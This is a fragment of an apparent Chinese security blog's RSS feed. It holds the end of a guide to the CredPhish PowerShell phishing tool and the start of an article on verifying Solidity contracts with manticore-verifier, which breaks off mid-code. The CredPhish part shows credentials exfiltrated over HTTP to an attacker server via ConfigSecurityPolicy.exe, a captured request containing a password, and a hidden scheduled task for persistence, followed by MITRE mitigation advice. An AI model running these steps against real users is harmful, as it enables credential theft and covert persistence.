&lt;p&gt;CredPhish内置的另一种外传方法是HTTP请求。它利用Windows Defender中包含的二进制文件“ConfigSecurityPolicy.exe”将凭证发送到攻击者的服务器。将**$enableHttpExfil&lt;strong&gt;变量设置为&lt;/strong&gt;$true**以启用它。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# http&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动HTTP服务器：python3 -m http.server 80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableHttpExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ConfigSecurityPolicy&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;发送的凭证，请在Kali中启动一个简单的HTTP服务器以在日志中捕获它们。&lt;/p&gt;
&lt;p&gt;在网络中，外传的凭证会显示如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UA-CPU: AMD64  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.56.104  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: Keep-Alive
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;由于凭证在传输前进行了URL编码，可以使用Burp的Decoder模块或Python的&lt;strong&gt;urllib&lt;/strong&gt;库通过命令行进行URL解码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%26e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cuRe-P&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%40s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%25r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%23%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;5D&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/DESKTOP-S4DAAF0[tokyoneon:#!Extr3m3Ly_&amp;amp;ecuRe-P@ssw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;D#]&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;credphishps1执行&#34;&gt;CredPhish.ps1执行
&lt;/h2&gt;&lt;p&gt;要快速测试CredPhish，请将&lt;strong&gt;credphish.ps1&lt;/strong&gt;移动到目标Windows 10机器并使用PowerShell执行它。&lt;/p&gt;
&lt;p&gt;一种持久化执行方法可能涉及&lt;strong&gt;任务计划程序&lt;/strong&gt;，这是Windows的一个组件，允许在预定义的时间间隔调度脚本执行。以下&lt;strong&gt;schtasks&lt;/strong&gt;示例将每2分钟执行一次&lt;strong&gt;credphish.ps1&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sc &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credphish&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -ep bypass -WindowStyle Hidden C:\path\to\credPhish\credphish.ps1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;缓解与检测&#34;&gt;缓解与检测
&lt;/h2&gt;&lt;p&gt;CredPhish源自&lt;strong&gt;Invoke-LoginPrompt&lt;/strong&gt;、&lt;strong&gt;CredsLeaker&lt;/strong&gt;和&lt;strong&gt;Stitch&lt;/strong&gt;等项目，并不是密码钓鱼的终极解决方案。由于此类攻击通常非常针对用户，因此仍有改进空间。更激进的方法可能涉及使用Cobalt Strike伪造整个Windows 10锁屏并通过这种方式捕获凭证。&lt;/p&gt;
&lt;p&gt;这类攻击技术难以通过预防性控制措施缓解，因为它们滥用了系统功能。&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;strong&gt;用户培训&lt;/strong&gt;提高对潜在恶意事件和对话框（例如Office文档提示输入凭证）的意识和警惕性。&lt;/li&gt;
&lt;li&gt;监控进程执行，检测异常程序和恶意实例的&lt;strong&gt;命令和脚本解释器&lt;/strong&gt;，这些程序可能会提示用户输入凭证。&lt;/li&gt;
&lt;li&gt;检查并审查输入提示的非法性指标，例如非传统的横幅、文本、时间和/或来源。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>智能合约验证变得更简单 - Manticore验证工具详解</title>
        <link>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%AA%8C%E8%AF%81%E5%8F%98%E5%BE%97%E6%9B%B4%E7%AE%80%E5%8D%95-manticore%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 17:56:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%AA%8C%E8%AF%81%E5%8F%98%E5%BE%97%E6%9B%B4%E7%AE%80%E5%8D%95-manticore%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;智能合约验证变得更简单&#34;&gt;智能合约验证变得更简单
&lt;/h1&gt;&lt;p&gt;智能合约开发者现在可以使用他们编写代码的语言（Solidity）来表达安全属性，我们的新工具manticore-verifier会自动验证这些不变量。更棒的是，Echidna和Manticore现在共享相同的属性测试规范格式。&lt;/p&gt;
&lt;p&gt;这意味着开发者只需编写一次属性测试，就可以同时进行模糊测试和符号执行验证！manticore-verifier从根本上降低了符号化测试任意属性所需的初始投入和成本。&lt;/p&gt;
&lt;h2 id=&#34;工作原理&#34;&gt;工作原理
&lt;/h2&gt;&lt;p&gt;智能合约的行为及其潜在漏洞往往具有独特性，并高度依赖于未明示的合约不变量。让我们测试一个简单合约：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Ownership&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;owner&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Owner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;owner&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;modifier&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;owner&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Pausable&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Ownership&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is_paused&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;modifier&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ifNotPaused&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;is_paused&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;paused&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isOwner&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;is_paused&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;resume&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isOwner&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;is_paused&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Token&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Pausable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;mapping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transfer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ifNotPaused&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该合约维护资产负债表并允许简单交易。用户可以发送代币给其他用户，但代币总量必须保持不变——即合约启动后不能再创建新代币。因此在这个不变量下，有效属性可以表述为：&amp;ldquo;如果只有10,000个代币，那么没有用户可以拥有超过这个数量。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;我们可以将这个属性表示为Solidity方法：&amp;ldquo;crytic_test_balance&amp;rdquo;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
